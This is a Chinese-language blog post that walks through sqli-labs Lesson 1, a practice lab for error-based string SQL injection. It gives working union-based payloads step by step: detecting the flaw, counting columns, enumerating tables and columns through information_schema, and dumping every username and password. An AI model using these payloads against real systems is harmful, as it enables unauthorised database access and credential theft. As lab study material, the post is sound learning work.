---
layout: post
title: sqli-labs Lesson-1 字符型注入
subtitle: 
date: 2020-01-03
author: kevin
header-img: img/green-bg.jpg
catalog: true
tags:
    - sql
    - sql injection
    - security
    - ctf
---



## preface



这篇文章是我正式学习 sql 注入的第一篇文章，下载了 sqli-labs 靶机作为渗透环境，里面的题目很多，有几十题的 sql 注入，跟着网上的 wp 一起做了一题，然后还是学到挺多东西的，这里拿第一关来记录一下



## sql 注入概念



通俗点说，就是要获取数据库里面所有的信息，包括这张表的字段个数，字段名分别是什么，在哪个数据库中，以及所有的记录，一般来说，黑客就会想知道有关管理员表的一些信息，作为学习，我就先将 sql 注入的一般的步骤写下来



1. 判断是否可注入以及注入点的类型（字符型，数字型，布尔型）
2. 猜解表中的字段数（一般利用 order by column_id）
3. 确定显示的字段顺序（一般用 union 联合查询）
4. 获取当前的数据库（通过 MySQL 内建的 database() 函数）
5. 获取表中的字段名
6. 下载数据



## 开始做题



### 判断注入点



下面就按照上面这几个步骤来对第一关进行 sql 注入吧，害，不过题目都说了是基于报错的字符型单引号注入了，有了先入为主的思想，就直接输入一个 `'` 进去了，然后看到报错信息，真的是用单引号包着的，所以猜测 sql 查询语句为

```sql
select xx from table where id='$id' limit 0, 1;
```

![error](https://i.loli.net/2020/01/04/5pvtiwQ4lFEebL8.png)



然后进一步查看是否存在 sql 注入，由于已知是字符型的注入了，所以我们分别输入 `'or'1'='1` 和 `'or'1'='2` 来看看返回的是不是相同的界面，如果不同的话就说明有 sql 注入漏洞

![1578127454967.png](https://i.loli.net/2020/01/04/nrVNCgmHS9qpAhv.png)

![1578127478997.png](https://i.loli.net/2020/01/04/tlqJf8zY6VcjPuC.png)



### 爆字段个数



可以看到返回的不同的数据，所以存在 sql 注入，下面我们就开始注入过程。首先确定一下这张表有几个字段，用 `order by column_id` 一个一个试，然后把后面的 sql 语句给注释掉来截断

![1578127659994.png](https://i.loli.net/2020/01/04/DT54rxqRdLPINoU.png)

试到 4 的时候报错了，所以确定了这张表只有 3 个字段

![1578127762664.png](https://i.loli.net/2020/01/04/EMKJSneVmkgs9RW.png)



### 爆显示顺序



紧接着，第二步，确定显示出来的是哪几个字段，这里用 union 查询，并且将前面一个查询的结果给屏蔽，因为这个 sql 语句只能返回一条记录，如果前面输出了的话那么后面查询得到的数据就不会被显示出来，所以这里我们可以用下面这句来构造 payload

```sql
1' and 1=2 union select 1, 2 --+ 
```

但是报错了，说 union 查询的前后两条记录的字段数不相等，那么猜想真实的 sql 语句一定是 `select *` ，返回的是 3 个字段的记录

![1578129308538.png](https://i.loli.net/2020/01/04/G9Ry6KH7uQaojew.png)



那我们就再构造一个 payload

```sql
1' and 1=2 union select 1, 2, 3 --+ 
```

![select-1-2-3](https://i.loli.net/2020/01/04/XFDzSr3ZfPdlC2J.png)



### 爆数据库



这次显示的是 2， 3，所以 login_name 这个字段的顺序是 2，password 是 3，那么 id 肯定是 1 了，已经知道这些了，接下去就看下这个数据库叫什么名字，要先得到数据库的消息就可以用 mysql 内建的数据库查出表的名字，用下面这条 payload 获取数据库的名字

```sql
1' and 1=2 union select 1, database(), 3 --+ 
```



![1578129576658.png](https://i.loli.net/2020/01/04/qgJoxCHXfUnZjmM.png)



### 爆表名



ok，这张表所在的数据库的名字是 security，知道数据库的名字之后我们还得知道数据库是什么系统的，以及版本号，顺带也可以获取系统是 win 还是 linux ，虽然这里肯定是 MySQL 数据库，但是实战中不一定总是 MySQL ，所以要先查询一下，下面这些函数在我之前写的 [sql 基本语句](https://szukevin.site/2019/11/13/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84SQL%E8%AF%AD%E5%8F%A5/)中都找得到



可以像这样一个一个查询，查完之后换一个函数继续查，但是效率不高

```
1' and 1=2 union select 1, @@datadir, version() --+ 
1' and 1=2 union select 1, @@version_compile_os, user() --+ 
```



用 `concat_ws(separator,str1,str2,...)` 函数更加方便，这个函数的功能是将多个字符串拼接在一起，因此我们可以用这个函数一次性查询好多东西

```sql
1' and 1=2 union select 1, 2, concat_ws(',', @@datadir, version(), @@version_compile_os, user()) --+ 
```



![1578139631092.png](https://i.loli.net/2020/01/04/7w3hYL9UdajGiHS.png)



得知数据库是在 debian 系统上的 MariaDB（其实跟 MySQL 是一样的东西），接下来我们用 MySQL 中的 information_schema 数据库爆出表名

```sql
1' and 1=2 union select 1, 2, table_name from information_schema.tables where table_schema='security' --+ 
```



![1578130520986.png](https://i.loli.net/2020/01/04/jhYCoxwXWJQTI9r.png)



可以看到，只显示出了一个表名，这是因为它只取了第一行的记录，其实是有多行的，我们要用 `group_concat` 这个函数将多行记录放在一行显示

```sql
1' and 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema='security' --+ 
```

![1578130656386.png](https://i.loli.net/2020/01/04/6Bl2AuzxXMOmSo1.png)



### 爆字段名



然后看到了这个数据库里面有 4 张表，猜想这张表是 users ，然后爆出字段名，同样也是用到 information_schema 这个数据库，所以说这个数据库很重要

```sql
1' and 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='users' --+ 
```



![1578139721794.png](https://i.loli.net/2020/01/04/4whBe617vqQKRnO.png)



但是这里出现了好多字段，之前不是确认过了这张表只有三个字段的吗，原因就是我的环境中还有其他的数据库中的表也叫做 users ，为了避免这种情况，就要再筛选一下了



```sql
1' and 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security' --+ 
```

![1578138434738.png](https://i.loli.net/2020/01/04/5ICxjqW9cNifXg2.png)



### 爆所有数据



这下字段名就出来了，一个是 id ，一个是 username ，一个是 password ，接下去就可以根据字段名将数据库所有的用户信息都给爆出来了



```sql
1' and 1=2 union select 1, group_concat(username), group_concat(password) from users --+ 
```



![all-data](https://i.loli.net/2020/01/04/xfj81R69tDvqKVQ.png)



到这里就完成了一次注入，还挺有趣的，总之注入的时候就要想想后台的 sql 可能是怎么写的，然后去猜测信息，接着用一些手段来获取自己想得到的信息



## reference



https://blog.csdn.net/qq_43531669/article/details/90812561

